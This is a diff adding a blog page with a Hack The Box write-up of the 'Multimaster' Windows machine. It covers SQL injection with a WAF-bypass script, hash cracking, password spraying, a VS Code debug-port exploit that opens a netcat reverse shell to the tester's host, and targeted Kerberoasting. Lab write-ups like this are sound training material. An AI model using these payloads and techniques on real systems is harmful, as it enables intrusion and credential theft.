@@ -1,0 +1,804 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Multimaster - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Multimaster - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-multimaster/">
+
+
+  <meta property="og:description" content="Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-multimaster/multimaster_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-09-19T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-multimaster/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Multimaster - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Multimaster - Hack The Box">
+    <meta itemprop="description" content="Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.">
+    <meta itemprop="datePublished" content="September 19, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Multimaster - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-09-19T00:00:00+02:00">September 19, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-multimaster/multimaster_logo.png" alt="" /></p>
+
+<p>Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s an SQL injection in the web application search API the allow use to get database hashes</li>
+  <li>After finding that the hash used is Keccak-384, we are able to crack 3 passwords</li>
+  <li>After bruteforcing usernames with kerbrute, we spray the passwords we found and get one valid account for <code class="language-plaintext highlighter-rouge">alcibiades</code></li>
+  <li>User <code class="language-plaintext highlighter-rouge">alcibiades</code> can log in with WinRM and we use a local command execution vulnerability in VS Code to get another shell as user <code class="language-plaintext highlighter-rouge">cyork</code></li>
+  <li>User <code class="language-plaintext highlighter-rouge">cyork</code> has access to the .dll file of the ASP .NET webapp which contains the password <code class="language-plaintext highlighter-rouge">D3veL0pM3nT!</code> for the database <code class="language-plaintext highlighter-rouge">finder</code> user</li>
+  <li>We spray that <code class="language-plaintext highlighter-rouge">D3veL0pM3nT!</code> password and find that <code class="language-plaintext highlighter-rouge">sbauer</code> uses the same password</li>
+  <li>User <code class="language-plaintext highlighter-rouge">sbauer</code> has GenericWrite rights on user <code class="language-plaintext highlighter-rouge">jorden</code> so we can add an SPN to that user and kerberoast it</li>
+  <li>After cracking the hash for <code class="language-plaintext highlighter-rouge">jorden</code> and logging in, we see that he is a member of <code class="language-plaintext highlighter-rouge">Server Operators</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Server Operators</code> have <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> rights so we can read the administrators flag file</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<p>Since this is a Windows box, I expected there would be many ports open.</p>
+
+<p>A few things stand out looking at the nmap output:</p>
+<ul>
+  <li>It’s a domain controller because port 88 is open</li>
+  <li>The domain is MEGACORP.LOCAL</li>
+  <li>Microsoft SQL Server is running</li>
+  <li>IIS is running, maybe there’s a web app that uses an SQL backend</li>
+  <li>RDP is open but I doubt we can do anything with it</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/multimaster# nmap -p- 10.10.10.179
+[..]]
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open   http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: MegaCorp
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-07 19:24:04Z)
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+1433/tcp  open   ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2020-03-07T19:10:19
+|_Not valid after:  2050-03-07T19:10:19
+|_ssl-date: 2020-03-07T19:26:37+00:00; +9m03s from scanner time.
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+3389/tcp  open   ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-03-07T19:26:23+00:00
+| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+| Not valid before: 2020-03-06T19:09:42
+|_Not valid after:  2020-09-05T19:09:42
+|_ssl-date: 2020-03-07T19:26:36+00:00; +9m02s from scanner time.
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49673/tcp open   msrpc         Microsoft Windows RPC
+49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open   msrpc         Microsoft Windows RPC
+49676/tcp open   msrpc         Microsoft Windows RPC
+49693/tcp open   msrpc         Microsoft Windows RPC
+49696/tcp open   msrpc         Microsoft Windows RPC
+63393/tcp closed unknown
+63421/tcp closed unknown
+</code></pre></div></div>
+
+<h2 id="web-enumeration">Web enumeration</h2>
+
+<p>The website is an employee hub page written in Vue.js, but most of the links are not working.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/web1.png" alt="" /></p>
+
+<p>The login page is also not functional.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/web2.png" alt="" /></p>
+
+<p>The only thing that appears to work is the ‘Colleague Finder’ page:</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/colleagues.png" alt="" /></p>
+
+<p>The output from the query is JSON and Vue.js takes care of rendering the page.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql1.png" alt="" /></p>
+
+<p>When I tried different SQL injection payloads like single quotes I got 403 error messages, as well as when I sent too many queries so I knew there was some kind of WAF on the box. However by unicode encoding the characters I was able to bypass the WAF. Here I replaced a single quote by its unicode encoding and got a <code class="language-plaintext highlighter-rouge">null</code> answer instead of a 403 or empty JSON array.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql2.png" alt="" /></p>
+
+<p>I wrote a quick script to make SQLi testing faster than using Burp.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">readline</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.179/api/getColleagues"</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"http"</span><span class="p">:</span> <span class="s">"127.0.0.1:8080"</span> <span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">unicode_crap</span><span class="p">(</span><span class="n">txt</span><span class="p">):</span>
+	<span class="n">out</span> <span class="o">=</span> <span class="s">""</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">txt</span><span class="p">:</span>
+		<span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="s">'</span><span class="se">\\</span><span class="s">u00%s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
+	<span class="k">return</span> <span class="n">out</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"Content-type"</span><span class="p">:</span> <span class="s">"application/json"</span>
+	<span class="p">}</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+	<span class="n">encoded_cmd</span> <span class="o">=</span> <span class="n">unicode_crap</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="s">'{"name": "'</span> <span class="o">+</span> <span class="n">encoded_cmd</span> <span class="o">+</span> <span class="s">'"}'</span>
+	<span class="k">print</span> <span class="n">payload</span>
+	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+	<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Here, I found how many columns were in the table and I was able to use a UNION injection to include arbitrary data.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql3.png" alt="" /></p>
+
+<p>Found the current DB name: <code class="language-plaintext highlighter-rouge">Hub_DB</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql4.png" alt="" /></p>
+
+<p>Enumerated the tables in the database: <code class="language-plaintext highlighter-rouge">Colleagues</code> and <code class="language-plaintext highlighter-rouge">Logins</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql5.png" alt="" /></p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">Logins</code> table, I enumerated the columns and found the <code class="language-plaintext highlighter-rouge">password</code> one:</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql6.png" alt="" /></p>
+
+<p>Then I had all the pieces I needed to dump the <code class="language-plaintext highlighter-rouge">Logins</code> table:</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sql7.png" alt="" /></p>
+
+<p>There’s a bunch of accounts in there and after cleaning up the duplicate hashes I have the following list:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
+cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
+</code></pre></div></div>
+
+<p>At first that looked like some SHA-384 hashes but after trying a few different hash algorithms I was able to crack all of them except one using Keccak-384.</p>
+
+<p><code class="language-plaintext highlighter-rouge">hashcat -a 0 -m 17900 --force users_sqli_dump_hashes.txt /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sqlhash.png" alt="" /></p>
+
+<h2 id="enumerating-users-on-the-box">Enumerating users on the box</h2>
+
+<p>To check for valid accounts on the system I used kerbrute with the <code class="language-plaintext highlighter-rouge">xato-net-10-million-usernames.txt</code> wordlist.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/kerbrute.png" alt="" /></p>
+
+<p>The highlighted account <code class="language-plaintext highlighter-rouge">alcibiades@megacorp.local</code> is the one I was able to password spray.</p>
+
+<h2 id="password-spraying-the-credentials-from-the-database">Password spraying the credentials from the database</h2>
+
+<p>To password spray, I built a user file containing all the stuff from kerbrute plus the other accounts I had found from the SQL database. The password file only has the 3 password I managed to crack from the SQL hashes.</p>
+
+<p>Then I used crackmapexec to check the user/pass combinations against SMB.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/crackmapexec.png" alt="" /></p>
+
+<p>As shown above, the <code class="language-plaintext highlighter-rouge">alcibiades:finance1</code> are valid credentials.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">alcibiades</code> user can log in to the machine with WinRM and I was able to get the user flag.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/user.png" alt="" /></p>
+
+<h2 id="setting-up-windows-routing-through-kali-and-joining-the-domain">Setting up Windows routing through Kali and joining the domain</h2>
+
+<p>Since this was a Windows box with Active Directory running I expected I would need to run various tools from Powershell and I didn’t want to have to fight the AV running on the box so I fired up my Commando VM, routed it to the HTB lab through my Kali box (where NAT was configured) and joined it to the domain.</p>
+
+<p>Here’s my script to configure IPv4 forwarding and NAT in Kali</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
+/sbin/iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
+</code></pre></div></div>
+
+<p>And here’s how I added the route for 10.10.10.0/24 on Windows (note the -p arguments, this is important so I don’t lose the changes after the reboot)</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/win_route.png" alt="" /></p>
+
+<p>I also configured my DNS settings to point to 10.10.10.179 so I can find the megacorp.local domain.</p>
+
+<p>By default, Windows users can add up to 10 machines to the domain so I just added my VM using the credentials from <code class="language-plaintext highlighter-rouge">alcibiades</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/win_domain2.png" alt="" /></p>
+
+<p>After rebooting, I added the <code class="language-plaintext highlighter-rouge">alcibiades</code> users to the local administators group on my machine. Luckily for me, there wasn’t any GPO preventing me from logging in with my local admin account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32 &gt; net localgroup administrators alcibiades /add
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Now I can log in to the server from my Windows VM:</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/winrm_alcibiades.png" alt="" /></p>
+
+<h2 id="priv-esc-from-alcibiades-to-cyork">Priv esc from alcibiades to cyork</h2>
+
+<p>Alcibiades doesn’t have any special privileges and he’s just a member of the <code class="language-plaintext highlighter-rouge">Domain Users</code> group and the <code class="language-plaintext highlighter-rouge">Remote Management Users</code>. I did notice that there was some odd ports listening on localhost when I checked out the <code class="language-plaintext highlighter-rouge">netstat</code> output.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/netstat.png" alt="" /></p>
+
+<p>The ports did seem to change every few minutes because when I re-ran the command I got different results. This pointed me in the direction of some scheduled task running in the background.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/netstat2.png" alt="" /></p>
+
+<p>Checking the list of running processes I noticed that the VS Code application was running. When I checked the output a few times I saw that the PID was changing so I assumed this was the scheduled task running. I tried listing the scheduled tasks from Powershell but my user didn’t have sufficient privileges.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/getprocess.png" alt="" /></p>
+
+<p>Phra from the Donkeys HTB team has a <a href="https://iwantmore.pizza/posts/cve-2019-1414.html">blog post</a> about CVE-2019-1414 which lets users get local execution by using the debug port on the VS Code Node.js server.</p>
+
+<p>In a nutshell, the debug port is bound to random TCP port everytime the application starts. Since I already had a shell on the machine I could watch the output of the netstat command and see what port is currently in use.</p>
+
+<p>I won’t paste the entire nodejs PoC since it’s already in the blog post but I did change the <code class="language-plaintext highlighter-rouge">spawnSync</code> arguments since the PoC was using using bash and Multimaster is a Windows box. It took me a while to figure out that forward slashes were required. I didn’t want to get bogged down in bypassing AV or AMSI so I just called netcat that I had uploaded onto the box.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="na">id</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+      <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Runtime.evaluate</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">params</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">expression</span><span class="p">:</span> <span class="s2">`spawnSync('/programdata/nc.exe', ['-e', 'cmd.exe', '10.10.14.30', '80'])`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+</code></pre></div></div>
+
+<p>To upload file with WinRM on Windows you can do the following:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-pssession</span><span class="w"> </span><span class="nx">multimaster.megacorp.local</span><span class="w">
+</span><span class="n">copy-item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">nc.exe</span><span class="w"> </span><span class="nt">-destination</span><span class="w"> </span><span class="nx">c:\programdata\nc.exe</span><span class="w"> </span><span class="nt">-tosession</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Because the port was only listening on localhost, I had to get some port-forwarding going. I could have used a Meterpreter shell but instead opted for chisel in SOCKS proxy mode.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/chisel_server.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/chisel_client.png" alt="" /></p>
+
+<p>Using proxychains, I launched the exploit and got a revere shell as user <code class="language-plaintext highlighter-rouge">cyork</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/codeshell.png" alt="" /></p>
+
+<h2 id="priv-esc-from-cyork-to-sbauer">Priv esc from cyork to sbauer</h2>
+
+<p>That part took a bit of time, I looked around the file system and the only different thing with <code class="language-plaintext highlighter-rouge">cyork</code> is he’s a member of the <code class="language-plaintext highlighter-rouge">Developers</code> group. I couldn’t access anything else until I noticed I had access to the web server .dll file used by the web application. I poked inside and saw that the database <code class="language-plaintext highlighter-rouge">finder</code> user credentials were hardcoded inside <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\bin\MultimasterAPI.dll</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/dllpassword.png" alt="" /></p>
+
+<p>I sprayed that password across all the accounts and found a match for <code class="language-plaintext highlighter-rouge">sbauer:D3veL0pM3nT!</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/sbauer_spray.png" alt="" /></p>
+
+<h2 id="priv-esc-from-sbauer-to-jorden">Priv esc from sbauer to jorden</h2>
+
+<p>Using Powerview, I checked the ACL’s and saw an interesting entry:</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/powerview.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">sbauer</code> has <code class="language-plaintext highlighter-rouge">GenericWrite</code> privileges on <code class="language-plaintext highlighter-rouge">jorden</code> which means we can change some his attributes like logon script, etc. An interesting technique here is we can add an SPN to the account then kerberoast it.</p>
+
+<p>Ref: <a href="https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">Targeted Kerberoasting</a></p>
+
+<p>So I just had to add an SPN to <code class="language-plaintext highlighter-rouge">jorden</code> then was able to kerberoast his account.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/jordenkerb.png" alt="" /></p>
+
+<p>I was able to crack the hash with John The Ripper: <code class="language-plaintext highlighter-rouge">rainforest786</code></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/jordenpwd.png" alt="" /></p>
+
+<p>I logged back into my Windows VM with the <code class="language-plaintext highlighter-rouge">jorden</code> user account and confirmed I was able to access the server through WinRM.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/jordenshell.png" alt="" /></p>
+
+<h2 id="getting-the-root-flag">Getting the root flag</h2>
+
+<p>User <code class="language-plaintext highlighter-rouge">jorden</code> is a member of the <code class="language-plaintext highlighter-rouge">Server Operators</code> group, which gives him the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> and <code class="language-plaintext highlighter-rouge">SeRestorePrivilege</code> rights.</p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/jordenpriv.png" alt="" /></p>
+
+<p>In a nutshell, using the backup privileges, we can view/change any files on the system. Here because I was pressed for time trying to get first blood on the system I opted to read the flag file directly instead of trying to land a shell as administrator.</p>
+
+<p>I used the following github PoC to read the file.</p>
+
+<p>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a></p>
+
+<p><img src="/assets/images/htb-writeup-multimaster/root.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">ad</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#backup-operators" class="page__taxonomy-item" rel="tag">backup operators</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#chisel" class="page__taxonomy-item" rel="tag">chisel</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#keccak" class="page__taxonomy-item" rel="tag">keccak</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kerberoasting" class="page__taxonomy-item" rel="tag">kerberoasting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#password-spray" class="page__taxonomy-item" rel="tag">password spray</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powerview" class="page__taxonomy-item" rel="tag">powerview</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#server-operators" class="page__taxonomy-item" rel="tag">server operators</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vs-code" class="page__taxonomy-item" rel="tag">vs code</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#winrm" class="page__taxonomy-item" rel="tag">winrm</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
